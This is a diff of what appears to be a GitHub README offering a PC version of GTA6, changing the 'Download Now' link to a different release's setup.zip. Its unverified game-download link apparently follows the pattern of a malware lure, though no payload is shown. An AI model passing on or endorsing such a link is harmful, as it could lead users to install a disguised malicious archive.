@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ApothecaryAcclaim/GTA6-PC-Version/releases/download/sey/setup.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ApothecaryAcclaim/GTA6-PC-Version/releases/download/sty/setup.zip)
 [![Version](https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge)]()
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey?style=for-the-badge)]()
 
